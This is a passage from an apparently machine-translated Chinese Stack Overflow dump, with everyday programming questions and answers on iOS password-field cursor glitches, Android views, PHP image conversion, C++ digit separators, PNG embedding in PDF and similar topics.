[08/Jan/2013:17:35:33 +0000] [www.mysite.com/sid#b970c168][rid#b9914e08/initial] (1) [perdir /home/mysite.com/public_html/] internal redirect with /home/mysite.com/public_html/about-us.php [INTERNAL REDIRECT]
[08/Jan/2013:17:35:33 +0000] [www.mysite.com/sid#b970c168][rid#b991e190/initial/redir#1] (1) [perdir /home/mysite.com/public_html/] pass through /home/mysite.com/public_html/home
[08/Jan/2013:17:35:34 +0000] [www.mysite.com/sid#b970c168][rid#b9914e08/initial] (1) [perdir /home/mysite.com/public_html/] pass through /home/mysite.com/public_html/favicon.ico 
```

如何阻止它重定向到文件路径，并使其重定向到 www.site.com/file？

# ios - 在 secureTextEntry 切换后 UITextField 有尾随空格

> ID：14220187
> 
> 赞同：35
> 
> 时间：2013-01-08T16:59:27.580
> 
> 标签：ios, uitextfield

我有一个在显示/隐藏模式之间切换的按钮（即在secureTextEntry NO 和YES 之间切换UITextField）。其目的是允许用户查看他们输入的密码。

我在这里遵循了示例（投票数最高）：[UITextField secureTextEntry - 从 YES 变为 NO，但改回 YES 无效](https://stackoverflow.com/questions/6710019/uitextfield-securetextentry-works-going-from-yes-to-no-but-changing-back-to-y)

但是，当我将 secureTextEntry 设置为 NO 时，在此处写入的任何文本都以空格结尾。将secureTextEntry 设置为YES 时，这似乎不是问题。

例如，如果我在 setSecureTextEntry 设置为 NO 时输入文本“mypassword”，然后将其切换为 YES，用户将看到 **********（10 个点），这是正确的。如果我将SecureTextEntry 设置为NO，用户将看到“mypassword”（末尾有一个空格，或者至少光标向右移动了一个空格）。

**重要提示：** 在调试器中，文本的字符串值出现**时没有**尾随空格，如下所示：

```
(lldb) expr self.passwordText.text
(NSString *) $0 = 0x1d8450e0 @"mypassword" 
```

我试过修剪空格（[避免 UITextField 中的中间空格](https://stackoverflow.com/questions/4463496/avoid-middle-whitespace-in-uitextfield)），但它没有效果。

* * *

## 回答 #1

> 赞同：42
> 
> 时间：2014-12-15T02:43:57.097

我刚刚遇到这种情况，终于解决了这个问题。

适用于最新的 iOS SDK，iOS 8.1

首先，根本没有尾随空格。

点（在 SecureEntry 中显示）字符和普通字符具有不同的宽度，并且在您切换 isSecureEntry 开关后，光标没有刷新它的位置。

所以我使用这个解决方法来解决这个问题。

```
- (void)toggle
{
    NSString *tmpString;
    [self.passwordTextField setSecureTextEntry:!self.passwordTextField.isSecureTextEntry];
    if (self.passwordTextField.isSecureTextEntry) {
       // do stuffs
    } else {
       // do other stuffs
    }
    // Workaround to refresh cursor
    tmpString = self.passwordTextField.text;
    self.passwordTextField.text = @" ";
    self.passwordTextField.text = tmpString;
} 
```

**斯威夫特 3+**

```
 // Workaround to refresh cursor

    let currentText: String = self.userPassword.text!
    self.userPassword.text = "";
    self.userPassword.text = currentText 
```

希望能帮助到你！

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2014-03-20T15:33:23.033

PRE-iOS-8.0 *（过时的解决方案）*`secureTextEntry` ...在按钮的操作方法中（在YES 和 NO之间切换），只需将`UITextField`'`text`属性设置为其当前`text`值。尽管这可能看起来多余并且有点像 hack，但这会在正确的位置重新绘制光标。这是按钮的操作方法现在应该是什么样子的示例...

```
-(void)toggleButtonPressed:(UIButton*)sender
{
    // Toggle between secure and not-so-secure entry
    self.toggleButton.selected = !self.toggleButton.selected;
    self.textfield.secureTextEntry = !self.toggleButton.selected;

    // * Redundant (but necessary) line *
    [self.textfield setText:self.textfield.text];
} 
```

POST-iOS-8.0... 从 iOS 8.0 开始，当使用等于其当前字符串值的字符串调用时，似乎`UITextField`'s `text`setter 不再重绘光标。现在，我们需要更进一步，`text`在再次重置之前实际更改值。`setText:`用类似这些行的内容替换上面的行。

```
// * Extra redundant (but necessary) lines *
NSString *currentText = self.textfield.text;
[self.textfield setText:@"Arbitrary string..."]; // Change the value
[self.textfield setText:currentText]; // Reset the value 
```

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2015-11-30T02:57:45.403

我有一个干净的解决方案，不会`text`因为`UITextField`.

用这种风格包裹它们。

```
[self.passwordTextField resignFirstResponder]; // first resign its first responder.

// change `secureTextEntry` property's value if necessary.

if (self.passwordTextField.secureTextEntry) {
    self.passwordTextField.secureTextEntry = NO;
    self.passwordEcryptButton.selected = YES;
}else{
    self.passwordTextField.secureTextEntry = YES;
    self.passwordEcryptButton.selected = NO;
}

[self.passwordTextField becomeFirstResponder];  // finally gain its first responder again. 
```

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2015-06-16T10:35:51.320

为了解决 iOS 中的这个错误，您可以简单地执行以下操作（适用于任何 iOS 版本）：

```
- (IBAction)toggleSecureTextEntry:(UIButton *)button
{
    self.textField.secureTextEntry = !self.textField.secureTextEntry;
    NSString *originalText = self.textField.text;
    self.textField.text = nil;
    self.textField.text = originalText;
} 
```

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2015-09-29T15:13:54.657

你可以像这样修复它：

```
NSString *currentText = self.textfield.text;
self.textfield.text = @"";
self.textfield.text = currentText; 
```

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2014-10-09T09:10:24.500

这适用于我在 iOS 8 上

```
if (self.passwordTextField.secureTextEntry) {
    // Display password and keep selected text range
    UITextRange *selectedTextRange = self.passwordTextField.selectedTextRange;
    NSString *password = self.passwordTextField.text;
    self.passwordTextField.secureTextEntry = NO;
    self.passwordTextField.text = [@"" stringByPaddingToLength:password.length withString:@" " startingAtIndex:0]; // Done for carret redrawing
    self.passwordTextField.text = password;
    self.passwordTextField.selectedTextRange = selectedTextRange;
}
else {
    // Hide password and keep selected text range
    UITextRange *selectedTextRange = self.passwordTextField.selectedTextRange;
    NSString *password = self.passwordTextField.text;
    self.passwordTextField.secureTextEntry = YES;
    self.passwordTextField.text = [@"" stringByPaddingToLength:password.length withString:@" " startingAtIndex:0]; // Done for carret redrawing
    self.passwordTextField.text = password;
    self.passwordTextField.selectedTextRange = selectedTextRange;
} 
```

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2014-12-03T10:23:48.973

```
UITextPosition *beginning = [self.passwordField beginningOfDocument];
[self.passwordField setSelectedTextRange:[self.passwordField textRangeFromPosition:beginning
                                                                        toPosition:beginning]];

UITextPosition *end = [self.passwordField endOfDocument];
[self.passwordField setSelectedTextRange:[self.passwordField textRangeFromPosition:end
                                                                        toPosition:end]]; 
```

这是我在 iOS 8 上使用的

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2014-12-03T20:17:48.860

当我们更改 textfield.secureTextEntry 属性时，插入符号位置不会更新。为了解决这个问题，下面的代码曾经在 IOS 8 之前工作：

```
pwdTextField.text  = pwdTextField.text 
```

现在没有了。似乎 IOS 8 检测到新值等于旧值并且什么都不做。因此，要使其再次工作，我们必须实际更改该值。这是适合我的快速版本。

```
let str = pwdTextField.text
pwdTextField.text = str + " "
pwdTextField.text = str 
```

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2015-02-20T14:10:35.827

这是解决此问题的另一种可能性，其中 self.passwordText 是 UITextField：

```
if (self.passwordText.isFirstResponder) {
    [self.passwordText resignFirstResponder];
    [self.passwordText becomeFirstResponder];
} 
```

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2013-01-08T19:21:26.160

似乎引用链接中的第二个解决方案在实施时具有不添加额外空间的所需行为：

[https://stackoverflow.com/a/8495888/738190](https://stackoverflow.com/a/8495888/738190)

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2015-06-18T13:19:26.920

这在我的情况下有效

```
 BOOL wasFirstResponder = [self.passwordTextField isFirstResponder];
    if([self.passwordTextField isSecureTextEntry])
    {
        //This three lines are key
        self.passwordTextField.delegate = nil;
        [self.passwordTextField resignFirstResponder];
        self.passwordTextField.delegate = self;
    }

    [self.passwordTextField setSecureTextEntry: !self.passwordTextField.isSecureTextEntry];
    if(wasFirstResponder)
        [self.passwordTextField becomeFirstResponder]; 
```

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2016-05-22T08:44:36.873

Swift UITextField 扩展：

```
extension UITextField {
    func toggleSecureEntry() {
        let wasFirstResponder = isFirstResponder

        if wasFirstResponder { resignFirstResponder() }
        isSecureTextEntry.toggle()
        if wasFirstResponder { becomeFirstResponder() }
    }
} 
```

设置 textField.text 解决方案在某些情况下也有效，但不适合我的需要（带有两个文本字段的自定义字体。导致字体更改和运行时出现故障。）也添加在这里。

```
func toggleSecureEntry() {
    isSecureTextEntry.toggle()
    let originalText = text
    text = nil
    text = originalText
} 
```

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2015-09-26T09:37:45.210

为了让光标正确重新定位，设置字体属性似乎对我有用。

```
// Hack to update cursor position
self.passwordTf.defaultTextAttributes = @{NSFontAttributeName: textFieldFont, NSForegroundColorAttributeName: textFieldColor};

// Change secure entry
self.passwordTf.secureTextEntry = !self.passwordTf.secureTextEntry; 
```

在 iOS8、iOS9 上测试。希望能帮助到你！

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2016-04-13T07:26:32.353

每次在 UITextField 中设置文本时，都会更新光标位置

所以我使用了这段代码

```
partial void btnShowPassword_ToutchUpInside (UIButton sender)
    {
        if (TxtPassword.SecureTextEntry == true) {
            TxtPassword.SecureTextEntry = false;
            TxtPassword.Text = TxtPassword.Text;
        } else {
            TxtPassword.SecureTextEntry = true;
        }
    } 
```

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2016-08-31T14:13:27.670

我正在使用这个，工作正常。

```
[self.yourTextField becomeFirstResponder]; 
```

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2018-06-25T07:55:47.593

这是解决方案：

```
- (void)showHidePassword:(UIButton *)sender {
    EDSignUpCell *cell = [self.signUpTblView cellForRowAtIndexPath:[NSIndexPath indexPathForRow:3 inSection:0]];
    if(!TRIM_SPACE(cell.cellTextField.text).length) {return;}
    [cell.showHidePasswordBtn setSelected:!cell.showHidePasswordBtn.isSelected];
    cell.cellTextField.secureTextEntry = cell.showHidePasswordBtn.isSelected;
    [cell.cellTextField setText:cell.cellTextField.text];
    [cell.cellTextField becomeFirstResponder];
} 
```

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2018-08-17T12:54:16.263

## 斯威夫特 4

Bug 正在雷达上，也有解决方法的解释：[http ://www.openradar.me/38465011](http://www.openradar.me/38465011)

以下是如何本地更新插入符号（光标）位置的临时解决方法。

```
// update caret position
DispatchQueue.main.asyncAfter(deadline: .now() + 0.01) {
    let (beginning, end) = (self.beginningOfDocument, self.endOfDocument)

    self.selectedTextRange = self.textRange(from: beginning, to: end)
    self.selectedTextRange = self.textRange(from: end, to: end)
} 
```

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2019-04-23T17:14:25.703

我有一个类似的问题，并意识到这是因为我在设置 secureTextEntry 属性*之前更新了文本。*如果 textField 使用secureTextEntry，它会在它所在的位置绘制插入符号，这是有道理的。

我没有阅读整个问题，也没有访问 OP 链接的解决方案，但如果其他人遇到与我相同的问题：

在设置 secureTextEntry 属性*后*尝试更新您的文本。

# android - 查找不在当前视图中的视图

> ID：14220188
> 
> 赞同：0
> 
> 时间：2013-01-08T16:59:31.523
> 
> 标签：android, view

我目前正在尝试实现一个`ViewPager`. 我在 ViewPager 中有两个页面，它们都包含许多文本字段、复选框、按钮和微调器。

假设这两个 XML 文件是`layout1.xml`和`layout2.xml`. 它们都有带有 ID`checkbox1`和的复选框`checkbox2`。有没有办法按照以下方式调用某些东西

```
 Checkbox check1 = (CheckBox) findViewById( R.layout.layout1.id.checkbox1 );
 Checkbox check2 = (Checkbox) findViewById( R.layout.layout2.id.checkbox2 ); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:14:06.590

该类`View`有一个`findViewById`方法，它允许您查找仅属于该视图的子视图。如果您获得对每个页面`View`容器的引用，则可以分别获得`CheckBox`：

```
CheckBox check1 = (CheckBox) view1.findViewById(R.id.checkbox1);
CheckBox check2 = (CheckBox) view2.findViewById(R.id.checkbox1); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T19:15:13.507

发现最好的方法是使用`LayoutInflater`.[`Look at this question for reference`](https://stackoverflow.com/questions/14221986/how-can-i-reference-layout-files-other-than-the-current-one)

# php - 将 PNG 转换为 JPEG 文件

> ID：14220191
> 
> 赞同：0
> 
> 时间：2013-01-08T16:59:48.720
> 
> 标签：php, gd

我有一个将 PNG 文件转换为 JPEG 文件的脚本。除了，我不确定它是如何工作的。$outputPngFile 和 $outputJpgFile 有什么用？我可以使用 tmp 文件执行此操作吗，例如用户上传文件时？那么，如何访问新文件以将其移动到正确的图像目录？

```
function pngTojpg($image, $outputPngFile, $outputJpgFile, $quality) {
$image = imagecreatefrompng($image);

//Save the png image
imagepng($image, $outputPngFile);         

//Save the jpeg image
imagejpeg($image, $outputJpgFile, $quality);

// Free up memory
imagedestroy($image);
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-08T17:02:16.580

```
<?php
$image = imagecreatefrompng('yourlocation/image.png');
imagejpeg($image, 'yournewlocation/image.jpg', 70);
imagedestroy($image);
?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T17:21:41.070

它可能会帮助您知道您正在使用与 PHP 捆绑在一起的[GD 库](http://php.net/manual/en/book.image.php)。

[该函数所做的](http://php.net/manual/en/function.imagejpeg.php)是获取`$image`png[图像](http://php.net/manual/en/function.imagepng.php)[`imagecreatefrompng`](http://php.net/manual/en/function.imagecreatefrompng.php)的路径（[使用](http://php.net/manual/en/function.imagejpeg.php)特定[压缩](http://php.net/manual/en/function.imagedestroy.php)因子（_`$outputPngFile``$outputJpgFile``$quality`

由于它也将图像保存为 png，因此该函数显然旨在用于保存来自外部源（由 URL 提供）或来自用户上传的临时文件的图像。你可以做任何一个，只要你提供给图像文件的路径是有效的，PHP 并不关心。

# phpdoc - PHPDoc 创建/修改日期/时间戳

> ID：14220192
> 
> 赞同：8
> 
> 时间：2013-01-08T16:59:55.473
> 
> 标签：phpdoc

什么（如果有）标签可用于指定 PHPDocumentor 的创建和/或最后修改日期？例如：

```
@created 2013-01-01
@author John Doe
@updated 2013-01-06 
```

这主要用于文件级 DocBlocks。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2020-06-24T20:07:05.687

老问题，但我很好奇是否有向文档块添加日期的标准并找到了这个问题。

对于我的特定用例，我确实使用代码版本/版本控制，但我是一个项目的独立开发人员，所以我只查看我的代码，并且由于我的数据是基于日期的，我喜欢`@introduced yyyy-mm-dd`在我的文档块中使用标签。很好，很容易理解，当发布特定标签时，我不必追查。我的代码是版本控制的，所以我可以查看行/函数历史记录，所以我从不添加/更改日期。

```
 /**
 * A brief description of the function
 * 
 * @introduced 2020-06-24
 * @return array
 */
 public funcition hello()
 {
   return 'world';
 } 
```

# ravendb - Raven DB HTTP API - 属性遍历

> ID：14220195
> 
> 赞同：1
> 
> 时间：2013-01-08T17:00:25.547
> 
> 标签：ravendb, ravendb-http

我得到以下 JSON 结构：

```
{
    "document": {
        "sections": {
            "x": {
                "title": "foo"
            },
            "y": {
                "title": "bar"
            }
        }
    }
} 
```

如何使用 HTTP API 更新给定部分的 title 属性值？

我想提供一个路径（字符串）来访问该属性。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-08T00:17:24.620

这已在 build 2254 中修复。您现在应该能够像这样发布单个脚本补丁：

```
EVAL http://localhost:8080/docs/foos/1

{Script:"this.document.sections.x.title = newTitle;",Values:{"newTitle":"Whatever"}} 
```

# python - wx.Notebook 选项卡只显示在左上角裁剪而不是占据整个框架？

> ID：14220209
> 
> 赞同：2
> 
> 时间：2013-01-08T17:01:12.053
> 
> 标签：python, wxpython, wxwidgets

我正在尝试`wx.Notebook` `tabs`在我的一个 gui 中测试它。但是，我遇到了一个问题，即只有一小部分选项卡显示在左上角。

![在此处输入图像描述](../Images/6a9f7493bef4f2be4b3136aaeeffa553.png)

如您所见，它只显示了很小的一部分。我不知道出了什么问题。

我的代码如下：

```
import wx
class MyFrame(wx.Frame):
    def __init__(self, parent, id):
        wx.Frame.__init__(self, parent, id, "test", size=(640,480))
        panel = wx.Panel(self)

        notebook = wx.Notebook(panel, style=wx.BK_DEFAULT, size=(640,480))
        tabOne = wx.Panel(notebook)
        notebook.AddPage(tabOne, "Tab One")

        sizer = wx.BoxSizer(wx.VERTICAL)
        sizer.Add(notebook, flag=wx.EXPAND)
        self.SetSizer(sizer)

if __name__ == '__main__':

    app = wx.PySimpleApp(redirect=False)
    frame = MyFrame(parent=None, id=-1)
    frame.Show()
    app.MainLoop() 
```

有谁知道什么会导致这样的事情？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:13:06.777

您必须修复一行：

```
notebook = wx.Notebook(self, style=wx.BK_DEFAULT, size=(640,480)) 
```

以前，您将笔记本创建为`panel`未设置任何 sizer 的子笔记本。因此体积小。`panel`现在已经过时了。

# android - 拆分文本，使文本视图中的文本视图为假

> ID：14220213
> 
> 赞同：0
> 
> 时间：2013-01-08T17:01:15.097
> 
> 标签：android, android-layout

我有一个文本文件，我想在文本视图的数量中显示它的文本，我在运行时设置它们的文本。

这是我的代码，我用于我的程序：

```
while(text.length() > 0)
    {
        text = text.trim();
        int index = text.indexOf("L1");
        int index2 = 0;
        temp = "";
        if(index > -1 && index == 0)
        {
            index2 = text.indexOf("/L1");
            temp = text.substring(index + 2, index2);
            temp.trim();
            t = temp.toCharArray();
            text = text.substring(index2 + 3, text.length());
            index = text.indexOf("\r\n");
            while(index > -1 && index == 0)
            {
                temp += "\r\n";
                text = text.substring(index + 2, text.length());
                index = text.indexOf("\r\n");
            }
            temp = String.valueOf(t);
        }
        else
        {
            index = text.indexOf("L2");
            if(index > -1 && index == 0)
            {
                index2 = text.indexOf("/L2");
                temp = text.substring(index + 2, index2);
                text = text.substring(index2 + 3, text.length());
                index = text.indexOf("\r\n");
                while(index > -1 && index == 0)
                {
                    temp += "\r\n";
                    text = text.substring(index + 2, text.length());
                    index = text.indexOf("\r\n");
                }
            }
            else
            {
                index = text.indexOf("List");
                if(index > -1 && index == 0)
                {
                    index2 = text.indexOf("/List");
                    temp = text.substring(index + 4, index2);
                    text = text.substring(index2 + 5, text.length());
                    index = text.indexOf("\r\n");
                    while(index > -1 && index == 0)
                    {
                        temp += "\r\n";
                        text = text.substring(index + 2, text.length());
                        index = text.indexOf("\r\n");
                    }
                }
                else
                {
                    text = text.trim();
                    index = text.indexOf("Plain");
                    if(index > -1 && index == 0)
                    {
                        index2 = text.indexOf("/Plain");
                        temp = text.substring(index + 5, index2);
                        text = text.substring(index2 + 6, text.length());
                        index = text.indexOf("\r\n");
                        while(index > -1 && index == 0)
                        {
                            temp += "\r\n";
                            text = text.substring(index + 2, text.length());
                            index = text.indexOf("\r\n");
                        }
                    }
                }
            }
        }

    }
    for(int i = 0; i < texts.length; i++)
    {
        TextView tv = new TextView(this);
        tv.setText(Farsi.Convert(texts[i]));
        Typeface font = Typeface.createFromAsset(getAssets(), "fonts/naz.ttf");
        tv.setTypeface(font);
        tv.setTextColor(Color.BLACK);
        tv.setGravity(Gravity.RIGHT);
        tv.setPadding(10, 10, 10, 10);
        tv.setLayoutParams(params);
        linearLayout.addView(tv);
    }
    layout.addView(linearLayout);
    LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(LayoutParams.MATCH_PARENT, LayoutParams.MATCH_PARENT);
    this.addContentView(layout, p);
} 
```

由于某些原因，我在文本文件中使用了一些辅助词（例如“L1”和“/L1”），它们会在运行时删除它们。但是，当我运行程序时，在输出中显示在文本视图中的文本不是正确的样式，我想将它对齐到右边，但是在输出中有一些额外的文本，它们不在输入中文本文件。

在下面的 2 个图像中，我在输入文本文件中附加了带有和不带有辅助词的输出。

带有辅助词的输出：

![带有辅助词的输出：](../Images/b805d6d2e4e900659a10a91d62b2f835.png)

没有辅助词的输出，在这种状态下，我使用“setContentView”函数设置布局的内容，并使用辅助词索引读取整个文件而不是拆分文本。在这种状态下，输入不包含辅助词。

![输出无助词](../Images/1a72135b66fdc0c133117c8859c7c06f.png)

有什么问题啦？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:11:06.873

首先：
用来`String.split()`分割你的字符串。

它的工作原理是这样的，如果你有一个字符串 A,B,C 并且你使用`myString.split(,)`输出将是一个子字符串数组，即 [A,B,C]。
但这在您的情况下很有用，如果您可以使用相同的分隔符，即 L1 和 L2 将相同。

第二：您可以`android:gravity="right"`在`textview`您的`layout.xml`. 这将解决字符串左对齐的问题。

# css - 更改导航栏字体大小 phonegap

> ID：14220216
> 
> 赞同：0
> 
> 时间：2013-01-08T17:01:24.597
> 
> 标签：css, cordova, jquery-mobile

我正在尝试在我的 phonegap 应用程序中设置导航栏的字体大小。即使我更改了应用于导航栏的所有 css 样式的字体大小，文本按钮的字体大小也没有改变。如果我在网络导航器上运行代码，字体大小就会改变。

这是html代码：

```
<div data-role="navbar" class="nav-index" >
<ul>
<li><a href="javascript:p_menuVenta_main()" data-theme="c" data-icon="custom"
 id="venta">Venta</a></li> 
 <li><a href="p_pedido.html" data-theme="c" data-icon="custom" id="pedido">Pedidos</a>
</li>
<li><a href="" data-theme="c" data-icon="check">Liquidacion</a></li>
<li><a href="" data-theme="c" data-icon="info">Consultas</a></li>
</ul> 
```

这是css代码：

```
.index-footer .ui-btn .ui-btn-inner {
padding-top: 40px !important; 
}
.nav-index .ui-btn .ui-icon { 
width: 45px!important; 
height: 35px!important; 
margin-left: -24px !important; 
box-shadow: none!important; 
-moz-box-shadow: none!important; 
-webkit-box-shadow: none!important;
-webkit-border-radius: none !important;
border-radius: none !important; 
font-size: 12px;
}
#venta .ui-icon { 
background-image: url('images/venta.png');
background-repeat: no-repeat;
background-color: transparent;
background-position:center ;
}
#pedido .ui-icon { 
background-image: url('images/pedidos.png');
background-repeat: no-repeat;
background-color: transparent;
background-position: center ;
}
.ui-navbar .ui-btn-text  {
font-size: 6px;
}
.nav-index .ui-btn-text  {
font-size: 6px;
} 
```

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T09:15:06.300

解决了。我以错误的方式访问选择器。这是正确的方法：

```
#p_menuConsultas #menuPequenyo span{} 
```

# c++ - 在源代码中表示大数字以提高可读性？

> ID：14220217
> 
> 赞同：25
> 
> 时间：2013-01-08T17:01:33.553
> 
> 标签：c++, c, c-preprocessor

在用 C++ 或 C 编写的应用程序的源代码中，是否有一种更易读的方式来表示大数字？

让我们以数字为例`2,345,879,444,641`，在 C 或 C++ 中，如果我们想要一个程序返回这个数字，我们会这样做`return 2345879444641`。

但这不是真正可读的。

例如，在 PAWN（一种脚本语言）中，我可以做`return 2_345_879_444_641`，甚至`return 2_34_58_79_44_46_41`这些都将返回 number `2,345,879,444,641`。

这对于人眼来说更具可读性。

是否有 C 或 C++ 等价物？

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2013-01-08T17:36:05.853

使用当前编译器（C++14 或更高版本），您可以使用撇号，例如：

```
auto a = 1'234'567; 
```

如果您仍然坚持使用 C++11，您可以使用用户定义的文字来支持类似的内容：`int i = "1_000_000"_i`. 代码看起来像这样：

```
#include <iostream>
#include <string>
#include <cstdlib>

int operator "" _i (char const *in, size_t len) { 
    std::string input(in, len);
    int pos;

    while (std::string::npos != (pos=input.find_first_of("_,"))) 
        input.erase(pos, 1);

    return std::strtol(input.c_str(), NULL, 10);
}

int main() { 
    std::cout << "1_000_000_000"_i;
} 
```

正如我所写的那样，它支持下划线或逗号互换，因此您可以使用其中一个或两个，或两者兼而有之。例如，“1,000_000”会变成`1000000`.

当然，欧洲人可能更喜欢“.”。而不是“，”——如果是这样，请随意修改您认为合适的内容。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2013-01-08T17:10:33.743

使用[Boost.PP](http://www.boost.org/doc/libs/release/libs/preprocessor/)：

```
#define NUM(...) \
    NUM_SEQ(BOOST_PP_VARIADIC_TO_SEQ(__VA_ARGS__)) 
#define NUM_SEQ(seq) \
    BOOST_PP_SEQ_FOLD_LEFT(NUM_FOLD, BOOST_PP_SEQ_HEAD(seq), BOOST_PP_SEQ_TAIL(seq)) 
#define NUM_FOLD(_, acc, x) \
    BOOST_PP_CAT(acc, x) 
```

用法：

```
NUM(123, 456, 789) // Expands to 123456789 
```

[演示](http://stacked-crooked.com/view?id=f3a85a4f81d001bc4911eeedca1b346f)。

另一种方法是制作 UDL。留作练习（也因为它需要更多代码）。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2013-01-08T17:36:23.387

这是一个可以做到这一点的宏，在 MSVC 和 GCC 上都经过测试。不依赖 Boost...

```
#define NUM(...) NUM_(__VA_ARGS__, , , , , , , , , , )
#define NUM_(...) NUM_MSVCHACK((__VA_ARGS__))
#define NUM_MSVCHACK(numlist_) NUM__ numlist_
#define NUM__(a1_, a2_, a3_, a4_, a5_, a6_, a7_, a8_, ...) a1_##a2_##a3_##a4_##a5_##a6_##a7_##a8_ 
```

像这样使用它：

```
int y = NUM(1,2,3,4,5,6,7,8);
int x = NUM(100,460,694); 
```

产生：

```
int y = 12345678;
int x = 100460694; 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2014-02-18T03:35:06.740

对于*C++1y*，您现在可以使用单引号 ( `'`) 作为数字分隔符。基于[N3781：单引号作为数字分隔符](http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2013/n3781.pdf)，[最终被接受](https://twitter.com/stefanusdutoit/status/382945530722004992)。[gcc](http://gcc.gnu.org/projects/cxx1y.html)和[clang](http://clang.llvm.org/cxx_status.html)都支持此功能作为其*C++1y*实现的一部分。

所以下面的程序（*[看到它现场为铿锵](http://coliru.stacked-crooked.com/a/a1ddba4ef48570a2)*）：

```
#include <iostream>

int main(){
    std::cout << 2'345'879'444'641 << std::endl ;
} 
```

将输出：

> 2345879444641

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2013-01-08T17:03:31.603

您可以使用预处理器宏

```
 #define BILLION (1000*1000*1000) 
```

然后编码例如`(4*BILLION)`；如果你关心两个的大功率只是 ust`1<<30`

PS 注意这`1e6`是一个`double`文字（与 相同`1.0e6`）

您还可以：

1.  修补 GCC 词法分析器以接受`1_234_567`数字文字的符号并发布该补丁以符合 GPLv3 和自由软件精神。
    ^(可能在文件`libpp/lex.c`和/或`gcc/c-family/c-lex.c`和/或`gcc/cpp/lex.c`未来的 GCC 4.8 中，即当前的主干。)
2.  游说 C 和 C++ 标准化组织，以使其在未来的 C 或 C++ 标准中被接受。

# ssl - 客户端：在使用 tortoiseSVN 时，我禁止访问服务器，但在使用浏览器时我确实可以访问

> ID：14220218
> 
> 赞同：1
> 
> 时间：2013-01-08T17:01:32.650
> 
> 标签：ssl, svn, repository, configure, svn-checkout

我是配置服务器的人。它为将要访问它的公司提供 SVN+SSH 和 SSL。我能够浏览和结帐回购。防火墙已配置为允许访问另一家公司。他们可以在浏览器中浏览 repos，但在尝试 SVN 签出 repo 时会收到错误消息。错误消息：“禁止访问 'https://servernameaddress/path/to/repo'”。为什么他们可以在 Web 浏览器中浏览 repo，但不能使用 SVN 客户端结帐？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:03:23.430

他们是否通过代理连接到互联网？

如果他们在浏览器中配置了代理，那么 Tortoise 可能没有使用该代理。

# image - 如何在PDF中插入透明PNG？

> ID：14220221
> 
> 赞同：12
> 
> 时间：2013-01-08T17:01:44.973
> 
> 标签：image, pdf, adobe, imagemagick, png

我可以将 JPG 图像插入带有`DCTDecode`过滤器的 PDF 文档。我认为图像的所有参数也应该相同`PNG`，除了过滤器应该是`FlateDecode`. 但是，当我尝试`PNG`使用相同的参数插入时，PNG 图像在 PDF 文档中不可见。

**更新：**我得出的结论是 PDF 文件应该包括

```
1 0 obj <<
/Type /XObject
/Subtype /Image
/Width 512
/Height 512
/BitsPerComponent 8
/ColorSpace /DeviceRGB
/SMask 9 0 R
/Length 134753    
/Filter /FlateDecode
>>
stream
PNG_RAW DATA
endstream
endobj
9 0 obj <<
/Type /XObject
/Subtype /Image
/Width 512
/Height 512
/BitsPerComponent 8
/ColorSpace /DeviceGray
/Length 12087     
/Filter /FlateDecode
>>
stream
ALPHA_PIXELS
endstream
endobj 
```

但是我怎样才能分离`PNG`原始数据和`alpha pixels`通过`ImageMagick`？换句话说，什么`ImageMagick`命令可以生成`PDF_RAW_DATA`并`ALPHA_PIXELS`插入到 pdf 文件中。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-11-15T12:35:22.223

@Bobrovsky

这是一个例子： http: [//pd4ml.com/i/pd4ml18130.pdf](http://pd4ml.com/i/pd4ml18130.pdf)

更准确地说：您不能在没有任何操作的情况下绝对嵌入 PNG。您需要将 PNG 拆分为多个部分：IDAT（图像数据）作为未更改的字节流转到 PDF，PLTE（调色板）-到颜色空间定义，iCCP 可以选择转到颜色配置文件对象。

对象字典可能如下所示：

```
<<
/Filter /FlateDecode
/Type /XObject
/Subtype /Image
/BitsPerComponent 8
/Length 1277
/Height 250
/Width 250
/DecodeParms <<
    /BitsPerComponent 8
    /Predictor 15
    /Columns 250
    /Colors 1
>>
/ColorSpace [/Indexed /DeviceRGB 1 <1989d1ffffff>]
>>
stream
... IDAT bytes ... 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-01-08T18:35:25.023

很可能您没有解码 PNG 图像。

PDF 不直接支持 PNG。我的意思是它们不受支持 JPEG 的方式支持。

在将 PNG 嵌入 PDF 之前，您必须从 PNG 生成原始未压缩的光栅字节。如果您愿意，可以使用 Flate 或 LZW 编码器对光栅字节进行编码。

# java - Java 正则表达式：我希望使用正则表达式从 java 中的双引号返回值

> ID：14220223
> 
> 赞同：0
> 
> 时间：2013-01-08T17:01:46.153
> 
